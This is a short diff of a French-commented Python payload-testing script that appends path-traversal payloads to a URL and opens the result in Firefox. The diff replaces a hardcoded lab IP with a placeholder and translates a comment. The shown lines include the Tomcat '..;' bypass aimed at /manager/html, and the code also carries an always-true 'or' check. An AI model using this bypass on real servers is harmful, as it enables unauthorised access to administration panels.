@@ -67,7 +67,7 @@ def payload_tester():
                     print("Reponse :" + str(r.status_code))
                     launch = input("Lancer l'url modifié dans firefox ? [Y,N] : ")
                     if launch == 'Y' or 'y':
-                       #system('firefox "http://10.10.10.250/manager/..;/manager/html" ')
+                       #system('firefox "http://ip/manager/..;/manager/html" ')
                         system('firefox {}'.format(link))
                     elif args.batch:
                         print("l'argument batch est pris en compte...")
@@ -76,7 +76,7 @@ def payload_tester():
                         print(result)
                         
                     break
-                print("URL :" + args.url + payload + args.path) # 2x args.path ( url -(here)- payload )
+                print("URL :" + args.url + payload + args.path) # 2x args.path ( url -(ici)- payload )
                 print("payload : \033[91m{}\033[0m".format(payload))
                 count = len(payloads)
         if args.output:
@@ -93,7 +93,7 @@ def payload_tester():
 #def firefox():
     #launch = input("Lancer l'url modifié dans firefox ? [Y,N] : ")
     #if launch == 'Y' or 'y':
-        #system('firefox "http://10.10.10.250/manager/..;/manager/html" ')
+        #system('firefox "http://ip/manager/..;/manager/html" ')
      #   payload = '..;'
       #  system('firefox {}'.format(args.url, payload, args.path))
     #else:
